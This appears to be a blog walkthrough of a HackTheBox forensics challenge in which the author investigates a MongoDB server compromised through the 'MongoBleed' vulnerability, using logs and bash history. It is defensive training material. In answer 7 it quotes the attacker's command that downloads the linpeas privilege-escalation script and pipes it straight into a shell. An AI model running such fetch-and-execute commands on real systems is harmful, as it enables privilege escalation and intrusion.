<div>

# MangoBleed HTB Walkthrough {#mangobleed-htb-walkthrough .p-name}



This is basically a overview of the hackthebox sherlock mangobleed.

------------------------------------------------------------------------

### MangoBleed HTB Walkthrough 

This is basically a overview of the hackthebox sherlock mangobleed.


------------------------------------------------------------------------

Challenge Description

You were contacted early this morning to handle a high‑priority incident
involving a suspected compromised server. The host, mongodbsync, is a
secondary MongoDB server. According to the administrator, it's
maintained once a month, and they recently became aware of a
vulnerability referred to as MongoBleed. As a precaution, the
administrator has provided you with root-level access to facilitate your
investigation.

You have already collected a triage acquisition from the server using
UAC. Perform a rapid triage analysis of the collected artifacts to
determine whether the system has been compromised, identify any attacker
activity (initial access, persistence, privilege escalation, lateral
movement, or data access/exfiltration), and summarize your findings with
an initial incident assessment and recommended next steps.


------------------------------------------------------------------------

Now we will be going through the investigation regarding the challenge

1 What is the CVE ID designated to the MongoDB vulnerability explained
in the scenario?

For this we can just search for Mongobleed as it is also the challenge
name also we find a article by rapid7 about it

<figure id="215f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*qeoa1m7X0szLGo_wCQGZGw.png"
class="graf-image" data-image-id="1*qeoa1m7X0szLGo_wCQGZGw.png"
data-width="1642" data-height="721" data-is-featured="true" />
</figure>

Answer: CVE-2025--14847

2 What is the version of MongoDB installed on the server that the CVE
exploited?

For this question we can basically look at many place but i went to
check the /var/logs for mongodb folder and there i found mongodb.log, in
this file we can just search for the version

<figure id="b8df" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*cnXEkEJxBmw7TFeBPMEw_Q.png"
class="graf-image" data-image-id="1*cnXEkEJxBmw7TFeBPMEw_Q.png"
data-width="1484" data-height="273" />
<figcaption>Version</figcaption>
</figure>

Answer: 8.0.16

3 Analyze the MongoDB logs to identify the attacker's remote IP address
used to exploit the CVE.

Now we are asked to check the mongodb logs for any possible exploitation

Since i do not have much idea on how to detect these type of attacks in
logs so i began googling to find any relevant information then i
stumbled upon this blog
[https://blog.ecapuano.com/p/hunting-mongobleed-cve-2025-14847](https://blog.ecapuano.com/p/hunting-mongobleed-cve-2025-14847){.markup--anchor
.markup--p-anchor
data-href="https://blog.ecapuano.com/p/hunting-mongobleed-cve-2025-14847"
rel="nofollow noopener" target="_blank"} here i got a good amount of
information how this attack basically works and how i can detect. So
before moving to automated tools i tried just searching for event ID
22943 followed by 22944 multiple times during a continuous time frame so
this is some malicious IP

AttackerIP:65.0.76.43

<figure id="5525" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*FXZzww1sQBT0bINdeYNO_g.png"
class="graf-image" data-image-id="1*FXZzww1sQBT0bINdeYNO_g.png"
data-width="1446" data-height="162" />
</figure>

4 Based on the MongoDB logs, determine the exact date and time the
attacker's exploitation activity began (the earliest confirmed malicious
event)

In the same json log this is the first log for this so this is the
earliest confirmed malicious event

5 Using the MongoDB logs, calculate the total number of malicious
connections initiated by the attacker.

We can basically use this command to get this answer

``` {#330e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
 grep '65.0.76.43' mongod.log | wc -l
```

<figure id="b621" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/1*2NUXKv9pDktfz_O56SXO4A.png"
class="graf-image" data-image-id="1*2NUXKv9pDktfz_O56SXO4A.png"
data-width="831" data-height="85" />
</figure>

6 The attacker gained remote access after a series of brute‑force
attempts. The attack likely exposed sensitive information, which enabled
them to gain remote access. Based on the logs, when did the attacker
successfully gain interactive hands-on remote access?

Now we can check auth.log file for this question in /var/log

``` {#ddd7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
cat auth.log| grep "65.0.76.43" 
```

Now basically go through the logs and check for for some access
:::


<figure id="e584"
class="graf graf--figure graf--layoutOutsetCenter graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/1200/1*hwgUVUN9yFLbjV-KDh1Yiw.png"
class="graf-image" data-image-id="1*hwgUVUN9yFLbjV-KDh1Yiw.png"
data-width="1918" data-height="451" />
</figure>
:::

Here the attacker successfully gained access to the system

Time:2025--12--29 05:40:03

7 Identify the exact command line the attacker used to execute an
in‑memory script as part of their privilege‑escalation attempt.

Now we will checking what the attacker basically accessed within those 8
minutes time frame as we can see in the image above

For this purpose we can check the bash or zsh history whatever the
machine was running on check the mongoadmin folder in home we do not see
any file but if we basically check in terminal for hidden file we have
the files we require

<figure id="d666" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*63hZE0scx5N5k7_r4-c8ng.png"
class="graf-image" data-image-id="1*63hZE0scx5N5k7_r4-c8ng.png"
data-width="835" data-height="181" />
</figure>

Now we will be basically be reading the .bash_history file for any
traces of commands executed

<figure id="c13a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/1*vK4Ksug_nBg0rdCdFOtoSw.png"
class="graf-image" data-image-id="1*vK4Ksug_nBg0rdCdFOtoSw.png"
data-width="1327" data-height="393" />
</figure>

Here we see the attacker executed linpeas.sh for elevating their
privileges

Answer:curl -L
[https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh){.markup--anchor
.markup--p-anchor
data-href="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
rel="noopener" target="_blank"} \| sh

8 The attacker was interested in a specific directory and also opened a
Python web server, likely for exfiltration purposes. Which directory was
the target?

In the above image of the bash history we basically see that the
attacker is constantly going towards the mongodb folder in
/var/lib/mongodb/

Answer:/var/lib/mongodb

